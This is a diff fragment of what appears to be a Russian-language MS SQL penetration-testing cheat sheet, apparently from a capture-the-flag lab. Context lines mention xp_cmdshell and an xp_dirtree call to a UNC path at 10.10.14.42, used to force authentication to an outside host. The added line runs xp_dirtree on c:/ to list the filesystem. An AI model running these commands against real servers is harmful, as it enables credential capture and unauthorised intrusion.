@@ -107,6 +107,8 @@ xp_cmdshell
 
 xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аутентификацией
 
+exec xp_dirtree 'c:/';
+
 ********************
 select name from sys.databases;  (перечислить все базы данных)
 
